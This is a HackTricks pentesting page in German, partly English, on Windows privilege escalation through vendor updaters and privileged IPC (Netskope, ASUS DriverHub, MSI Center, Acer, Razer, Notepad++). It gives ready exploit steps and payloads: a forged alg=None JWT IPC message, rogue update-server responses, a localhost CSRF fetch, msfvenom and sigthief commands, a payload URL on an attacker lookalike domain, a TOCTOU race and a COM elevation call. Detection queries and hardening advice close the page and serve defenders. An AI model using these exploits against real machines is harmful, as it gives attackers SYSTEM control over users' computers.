# Missbrauch von Enterprise-Auto-Updaters und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Lokalprivilegieneskalationsketten, die in Enterprise-Endpoint-Agenten und Updatern gefunden werden und eine wenig restriktive IPC-Oberfläche sowie einen privilegierten Update-Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein niedrig privilegierter Benutzer eine Registrierung auf einen von Angreifern kontrollierten Server erzwingen und anschließend ein bösartiges MSI liefern kann, das vom SYSTEM-Dienst installiert wird.

Kernideen, die Sie gegen ähnliche Produkte wiederverwenden können:
- Missbrauche die localhost-IPC eines privilegierten Dienstes, um eine erneute Registrierung oder Neukonfiguration auf einen Angreifer-Server zu erzwingen.
- Implementiere die Update-Endpunkte des Vendors, liefere eine gefälschte Trusted Root CA und weise den Updater auf ein bösartiges, „signiertes“ Paket.
- Umgehe schwache Signer-Checks (CN allow-lists), optionale Digest-Flags und lockere MSI-Eigenschaften.
- Falls die IPC „encrypted“ ist, leite den key/IV aus weltlesbaren Maschinenidentifikatoren ab, die in der Registry gespeichert sind.
- Wenn der Dienst Anrufer nach image path/process name einschränkt, injiziere in einen allow-listed Prozess oder starte einen im Suspended-Zustand und bootstrappe deine DLL via einen minimalen thread-context patch.

---
## 1) Erzwingen einer Registrierung auf einen Angreifer-Server über localhost IPC

Viele Agenten liefern einen user-mode UI-Prozess, der über localhost TCP mithilfe von JSON mit einem SYSTEM-Dienst kommuniziert.

Beobachtet bei Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Erzeuge ein JWT-Enrollment-Token, dessen Claims den Backend-Host kontrollieren (z. B. AddonUrl). Verwende alg=None, sodass keine Signatur erforderlich ist.
2) Sende die IPC-Nachricht, die den provisioning command mit deinem JWT und Tenant-Namen aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Dienst beginnt, Ihren rogue Server für enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller-Verifikation auf Pfad/Name basiert, leiten Sie die Anfrage von einem erlaubten Vendor-Binary aus (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der Client mit Ihrem Server kommuniziert, implementieren Sie die erwarteten Endpunkte und lenken ihn auf eine bösartige MSI. Typische Abfolge:

1) /v2/config/org/clientconfig → Geben Sie eine JSON-Konfiguration mit einem sehr kurzen Update-Intervall zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Trusted-Root-Store des lokalen Computers.
3) /v2/checkupdate → Liefert Metadaten, die auf ein bösartiges MSI und eine gefälschte Version zeigen.

Bypassing common checks seen in the wild:
- Signer CN allow-list: Der Dienst prüft möglicherweise nur, ob der Subject CN gleich “netSkope Inc” oder “Netskope, Inc.” ist. Ihre bösartige CA kann ein Leaf mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST property: Fügen Sie eine harmlose MSI-Property namens CERT_DIGEST hinzu. Keine Durchsetzung bei der Installation.
- Optional digest enforcement: Ein Konfig-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Result: Der SYSTEM-Dienst installiert Ihr MSI von
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

---
## 3) Forging encrypted IPC requests (when present)

Ab R127 hat Netskope IPC-JSON in ein encryptData-Feld verpackt, das wie Base64 aussieht. Reverse-Engineering zeigte AES mit Key/IV, die aus für jeden lesbaren Registry-Werten abgeleitet werden:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Befehle als Standardbenutzer senden. Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, suchen Sie nach Geräte-IDs, Product-GUIDs, Install-IDs unter HKLM als Material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Manche Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung auflösen und den Image-Pfad/-Namen mit allow-gelisteten Vendor-Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL-Injection in einen allow-gelisteten Prozess (z. B. nsdiag.exe) und Proxying der IPC von innen.
- Ein allow-gelistetes Binary im suspended-Zustand spawnieren und Ihren Proxy-DLL bootstrappen ohne CreateRemoteThread (siehe §5), um driver-erzwungene Tamper-Regeln zu erfüllen.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkte liefern oft einen minifilter/OB callbacks driver (z. B. Stadrv), der gefährliche Rechte von Handles zu geschützten Prozessen entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen respektiert:
1) CreateProcess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Erhalten Sie Handles, die Ihnen noch erlaubt sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION auf dem Prozess und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn Sie Code an einer bekannten RIP patchen).
3) Überschreiben Sie ntdll!NtContinue (oder einen anderen frühen, garantiert gemappten Thunk) mit einem kleinen Stub, der LoadLibraryW auf Ihren DLL-Pfad aufruft und dann zurückspringt.
4) ResumeThread, um Ihren Stub im Prozess auszulösen und Ihre DLL zu laden.

Weil Sie niemals PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME auf einem bereits geschützten Prozess verwendet haben (Sie haben ihn erstellt), ist die Policy des Treibers erfüllt.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatisiert eine bösartige CA, das Signieren einer bösartigen MSI und stellt die benötigten Endpunkte bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein Custom-IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die suspended-process Injection enthält, sodass die Anfrage von einem allow-gelisteten Binary ausgeht.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wenn Sie auf einen neuen Endpoint-Agent oder eine Motherboard-„Helper“-Suite stoßen, reicht meist ein schneller Workflow aus, um festzustellen, ob es sich um ein vielversprechendes privesc-Ziel handelt:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für named pipes auflisten:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Auslesen von registry-backed routing data, die von plugin-based IPC servers verwendet werden:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zuerst Endpunktnamen, JSON-Schlüssel und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leak häufig das vollständige Schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` einbettet, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das Schema unten.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Sogar die unten gezeigte PowerShell CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Unsichere Code-Signing-Überprüfung & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige ausführbare Dateien herunter, die im JSON-Body definiert sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Prüfung der Download-URL verwendet dieselbe Substring-Logik, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe lediglich, dass das PE eine Signatur enthält und dass der Subject-String mit ASUS übereinstimmt, bevor es ausgeführt wird – kein `WinVerifyTrust`, keine Chain-Validation.

Zum Ausnutzen des Ablaufs:
1) Erstelle ein Payload (z.B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone ASUS’s signer hinein (z.B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer `.asus.com` Lookalike-Domain und trigger UpdateApp via dem oben genannten Browser-CSRF.

Weil sowohl die Origin- als auch die URL-Filter substring-basiert sind und die Signer-Prüfung nur Strings vergleicht, zieht DriverHub die Angreifer-Binary und führt sie im erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center exponiert ein TCP-Protokoll, bei dem jeder Frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` ist. Die Kernkomponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Deren Handler:
1) Kopiert das gelieferte ausführbare File nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur via `CS_CommonAPI.EX_CA::Verify` (Certificate Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt eine Scheduled Task, die die Temp-Datei als SYSTEM mit angreiferkontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen der Verifikation und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf ein legitimes MSI-signed Binary zeigt (garantiert, dass die Signaturprüfung besteht und die Task in die Queue kommt).
- Das mit wiederholten Frame B Nachrichten, die auf ein bösartiges Payload zeigen, racen und `MSI Center SDK.exe` kurz nach Abschluss der Verifikation überschreiben.

Wenn der Scheduler auslöst, führt er das überschriebenen Payload unter SYSTEM aus, obwohl zuvor die Originaldatei validiert wurde. Zuverlässige Ausnutzung verwendet zwei goroutines/threads, die CMD_AutoUpdateSDK spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, sodass Angreifer Befehle an beliebige Module routen können.
- Plugins können eigene Task-Runner definieren. `Support\API_Support.dll` exposet `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` auf mit **no signature validation** – jeder lokale Benutzer kann es auf `C:\Users\<user>\Desktop\payload.exe` zeigen und deterministisch SYSTEM-Ausführung erhalten.
- Loopback-Sniffing mit Wireshark oder Instrumentation der .NET-Binärdateien in dnSpy offenbart schnell das Component ↔ Command-Mapping; custom Go/ Python Clients können die Frames dann replayen.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und seine discretionary ACL erlaubt remote Clients (z.B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden von Command ID `7` mit einem Dateipfad ruft die Prozess-Spawn-Routine des Services auf.
- Die Client-Library serialisiert ein magic terminator-Byte (113) zusammen mit den args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentation-Tipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity SID abbildet, bevor `CreateProcessAsUser` aufgerufen wird.
- Ein Austausch von 113 (`0x71`) gegen 114 (`0x72`) führt in den generischen Branch, der das komplette SYSTEM-Token behält und eine High-Integrity SID (`S-1-16-12288`) setzt. Das gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch über Maschinen hinweg.
- Kombiniere das mit dem exposed Installer-Flag (`Setup.exe -nocheck`), um ACC auch auf Lab-VMs zu installieren und die Pipe ohne Vendor-Hardware zu testen.

Diese IPC-Bugs zeigen, warum localhost-Services gegenseitige Authentifizierung durchsetzen müssen (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) und warum der „run arbitrary binary“-Helper jedes Moduls dieselben signer-Verifikationen teilen muss.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 ergänzt dieses Muster: ein niedrig privilegierter Benutzer kann einen COM-Helper bitten, einen Prozess über `RzUtility.Elevator` zu starten, während die Trust-Entscheidung an eine user-mode DLL (`simple_service.dll`) delegated wird, anstatt robust innerhalb der privilegierten Grenze durchgesetzt zu werden.

Beobachteter Exploit-Pfad:
- Instanziere das COM-Objekt `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um einen erhöhten Start anzufordern.
- Im public PoC ist das PE-Signature-Gate innerhalb von `simple_service.dll` vor dem Ausführen der Anfrage gepatcht, sodass ein beliebiges vom Angreifer gewähltes Executable gestartet werden kann.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Generelle Erkenntnis: Beim Reversen von „Helper“-Suiten sollte man nicht bei localhost-TCP oder Named Pipes haltmachen. Prüfe auf COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` und verifiziere, ob der privilegierte Dienst die Ziel-Binary selbst validiert oder lediglich einem von einer patchbaren user-mode Client-DLL berechneten Ergebnis vertraut. Dieses Muster verallgemeinert sich über Razer hinaus: Jede geteilte Architektur, bei der der hochprivilegierte Broker eine Allow/Deny-Entscheidung von der niedrig privilegierten Seite übernimmt, ist eine potenzielle privesc-Angriffsfläche.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Ältere WinGUp-basierte Notepad++ Updater verifizierten die Authentizität von Updates nicht vollständig. Wenn Angreifer den Hosting-Provider des Update-Servers kompromittierten, konnten sie das XML-Manifest manipulieren und nur ausgewählte Clients auf Angreifer-URLs umleiten. Da der Client jede HTTPS-Antwort akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur durchzusetzen, luden und führten Opfer ein trojanisiertes NSIS `update.exe` aus.

Ablauf im Betrieb (kein lokaler Exploit erforderlich):
1. **Infrastructure interception**: Kompromittiere CDN/Hosting und beantworte Update-Checks mit Angreifer-Metadaten, die auf eine bösartige Download-URL zeigen.
2. **Trojanized NSIS**: Der Installer lädt/führt ein Payload aus und missbraucht zwei Ausführungsketten:
- **Bring-your-own signed binary + sideload**: Bündle das signierte Bitdefender `BluetoothService.exe` und lege eine bösartige `log.dll` in dessen Suchpfad. Wenn die signierte Binary läuft, sideloadet Windows die `log.dll`, die den Chrysalis-Backdoor entschlüsselt und reflectively lädt (Warbird-protected + API-Hashing zur Erschwerung statischer Erkennung).
- **Scripted shellcode injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und einen Cobalt Strike Beacon zu stagen.

Hardening-/Erkennungs-Hinweise für jeden Auto-Updater:
- Erzwinge **certificate + signature verification** des heruntergeladenen Installers (pinn den Signer des Vendors, lehne nicht übereinstimmende CN/chain ab) und signiere das Update-Manifest selbst (z. B. XMLDSig). Blockiere manifest-gesteuerte Redirects, sofern sie nicht validiert sind.
- Behandle **BYO signed binary sideloading** als post-download Detection-Pivot: Alarme auslösen, wenn eine signierte Vendor-EXE einen DLL-Namen aus außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender lädt `log.dll` aus Temp/Downloads) und wenn ein Updater Installer aus Temp ablegt/ausführt, die keine Vendor-Signatur haben.
- Überwache malwarespezifische Artefakte, die in dieser Kette beobachtet wurden (nützlich als generische Pivots): Mutex `Global\Jdhfv_1.0.1`, anomale `gup.exe`-Schreibvorgänge in `%TEMP%` und Lua-getriebene Shellcode-Injection-Stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen Nicht-Notepad++-Installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster lassen sich auf jeden Updater übertragen, der unsigned manifests akzeptiert oder es versäumt, installer signers zu pinnen — network hijack + malicious installer + BYO-signed sideloading führen zu remote code execution unter dem Deckmantel von “trusted” updates.

---
## Referenzen
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
